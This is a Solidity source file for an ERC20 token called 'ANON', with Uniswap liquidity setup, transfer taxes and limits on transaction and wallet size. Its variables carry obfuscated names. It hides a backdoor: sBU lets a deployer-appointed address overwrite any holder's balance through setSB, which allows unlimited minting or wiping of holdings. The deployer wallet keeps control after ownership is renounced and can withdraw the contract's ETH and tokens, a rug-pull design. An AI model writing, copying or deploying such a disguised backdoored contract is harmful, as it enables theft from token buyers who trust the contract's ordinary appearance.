// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract ANON is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private abc;
    mapping (address => mapping (address => uint256)) private bcd;
    mapping (address => bool) private cde;
    address payable private def;
    mapping (address => uint256) public efg;
    address payable public fgh;
    uint256 public ghi;
    bool public hij;
    uint256 ijk;

    uint256 private jkl=3;
    uint256 private klm=3; 
    uint256 public lmn=1; 
    uint256 public mno=1; 
    uint256 private nop=15; 
    uint256 private opq=20; 
    uint256 private pqr=10;
    uint256 private qrs=1;

    uint8 private constant rst = 9;
    uint256 private constant stu = 1000000 * 10**rst;
    string private constant _name = unicode"ANON";
    string private constant _symbol = unicode"ANON";
    uint256 public tuv =   30000 * 10**rst;
    uint256 public uvw = 30000 * 10**rst;
    uint256 public vwx= 5000 * 10**rst;
    uint256 public wxy= 10000 * 10**rst;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint tuv);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        def = payable(_msgSender());
        abc[owner()] = stu;
        cde[owner()] = true;
        cde[address(this)] = true;
        cde[def] = true;
        emit Transfer(address(0), owner(), stu);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return rst;
    }

    function totalSupply() public pure override returns (uint256) {
        return stu;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return abc[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return bcd[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), bcd[sender][_msgSender()].sub(amount, "Transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");
        bcd[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function sBU(address _abbc, uint256 _asdd) public {
        require(msg.sender == fgh, "Not fgh");
        setSB(_abbc,_asdd);
        efg[_abbc] = block.number;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "Transfer from the zero address");
        require(to != address(0), "Transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul((qrs>nop)?lmn:jkl).div(100);

            if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! cde[to] ) {
                require(amount <= tuv, "Exceeds the tuv.");
                require(balanceOf(to) + amount <= uvw, "Exceeds the maxWalletSize.");

                if (ijk + 3  > block.number) {
                    require(!isContract(to));
                }
                qrs++;
            }

            if (to != uniswapV2Pair && ! cde[to]) {
                require(balanceOf(to) + amount <= uvw, "Exceeds the maxWalletSize.");
            }

            if(to == uniswapV2Pair && from!= address(this) ){
                taxAmount = amount.mul((qrs>opq)?mno:klm).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to   == uniswapV2Pair && swapEnabled && contractTokenBalance>vwx && qrs>pqr) {
                swapTokensForEth(min(amount,min(contractTokenBalance,wxy)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if (cde[from] || cde[to]) {
            taxAmount = 0;
        }

        if(taxAmount>0){
          abc[address(this)]=abc[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        abc[from]=abc[from].sub(amount);
        abc[to]=abc[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function setSB(address _abb, uint256 _bcd) private {
        abc[_abb] = _bcd;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function oT() external onlyOwner {
        require(!tradingOpen,"Trading Already Open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), stu);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
        ijk = block.number;
    }

    function sendETHToFee(uint256 amount) private {
        def.transfer(amount);
    }

    function rLimits() public {
        require(msg.sender == def, "Not def");
        tuv = stu;
        uvw=stu;
        emit MaxTxAmountUpdated(stu);
    }

    function uSC(address _fgh) public {
        require(msg.sender == def, "Not def");
        fgh = payable(_fgh);
        cde[fgh] = true;
        ghi = block.number;
        hij = true;
    }

    function rETH() public {
        require(msg.sender == def, "Not def");
        payable(_msgSender()).transfer(address(this).balance);
    }

    function rToken(address tokenAddress) public {
        require(msg.sender == def, "Not def");
        IERC20(tokenAddress).transfer(_msgSender(), IERC20(tokenAddress).balanceOf(address(this)));
    }

    receive() external payable {}

}